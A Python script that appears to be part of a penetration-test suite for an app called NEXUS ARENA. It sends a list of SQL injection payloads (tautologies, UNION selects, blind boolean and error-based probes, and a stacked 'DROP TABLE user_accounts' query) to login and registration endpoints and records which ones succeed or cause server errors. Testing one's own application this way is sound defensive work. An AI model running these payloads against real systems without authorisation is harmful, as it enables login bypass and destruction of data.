#!/usr/bin/env python3
"""
02_sqli.py — SQL Injection Attack
===================================
Tests /api/auth/login and /api/auth/register for SQL injection
by injecting classic payloads into username and password fields.
"""

import requests
import json
import time

try:
    from config import TARGET_HTTP
except ImportError:
    from .config import TARGET_HTTP

BASE_URL = TARGET_HTTP
RESULTS = []

def log(label, vuln, detail):
    tag = "VULN" if vuln else "SAFE"
    print(f"  [{tag}] {label}")
    if detail:
        print(f"         -> {detail}")
    RESULTS.append({"test": label, "vulnerable": vuln, "detail": detail})

# Classic SQL injection payloads
SQLI_PAYLOADS = [
    # Tautology-based
    ("' OR '1'='1",           "SQLi Tautology: ' OR '1'='1"),
    ("' OR '1'='1'--",        "SQLi Tautology with comment: ' OR '1'='1'--"),
    ("' OR 1=1--",            "SQLi Numeric tautology: ' OR 1=1--"),
    ("admin'--",              "SQLi Comment bypass: admin'--"),
    ("' OR 'x'='x",           "SQLi String tautology: ' OR 'x'='x"),
    ("\" OR \"1\"=\"1",       "SQLi Double-quote tautology: \" OR \"1\"=\"1"),
    # UNION-based
    ("' UNION SELECT 1--",    "SQLi UNION SELECT 1"),
    ("' UNION SELECT null--", "SQLi UNION SELECT null"),
    # Stacked queries
    ("'; DROP TABLE user_accounts;--", "SQLi Stacked query: DROP TABLE"),
    # Blind boolean
    ("' AND 1=1--",           "SQLi Blind boolean true: ' AND 1=1--"),
    ("' AND 1=2--",           "SQLi Blind boolean false: ' AND 1=2--"),
    # Error-based
    ("' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--", "SQLi Error-based"),
]

def test_login(username, password, label):
    try:
        r = requests.post(f"{BASE_URL}/api/auth/login",
                          json={"username": username, "password": password},
                          timeout=6)
        body = {}
        try:
            body = r.json()
        except Exception:
            pass

        success = body.get("success", False)
        http = r.status_code
        vuln = success or http == 500
        detail = f"HTTP {http} - Auth success" if success else (f"HTTP 500 error" if http == 500 else f"HTTP {http} blocked")
        log(f"Login SQLi: {label}", vuln, detail)
        return success
    except Exception as e:
        log(f"Login SQLi: {label}", False, f"Connection timeout/error: {e}")
        return False

def test_register(username, label):
    try:
        r = requests.post(f"{BASE_URL}/api/auth/register",
                          json={"username": username, "password": "validpass123"},
                          timeout=6)
        http = r.status_code
        vuln = (http == 500)
        detail = "HTTP 500 database error" if vuln else f"HTTP {http} handled gracefully"
        log(f"Register SQLi: {label}", vuln, detail)
        return vuln
    except Exception as e:
        log(f"Register SQLi: {label}", False, f"Connection error: {e}")
        return False

def section(title):
    print(f"\n{'='*65}\n  {title}\n{'='*65}")

def run():
    global RESULTS
    RESULTS = []
    print("=" * 65)
    print("  NEXUS ARENA — SQL Injection Test Suite")
    print("=" * 65)
    print(f"  Server: {BASE_URL}")
    print(f"  Tests : {len(SQLI_PAYLOADS)} payloads\n")

    section("PHASE 1: SQLi in LOGIN username field")
    for payload, label in SQLI_PAYLOADS:
        test_login(payload, "wrongpass123", label)

    section("PHASE 2: SQLi in LOGIN password field")
    for payload, label in SQLI_PAYLOADS[:4]:
        test_login("CyberNinja", payload, label)

    section("PHASE 3: SQLi in REGISTER username field")
    for payload, label in SQLI_PAYLOADS[:4]:
        test_register(payload, label)

    print(f"\n{'='*65}")
    print(f"  SQL INJECTION TEST COMPLETE ({len(RESULTS)} findings recorded)")
    print(f"{'='*65}\n")
    return RESULTS

if __name__ == "__main__":
    run()
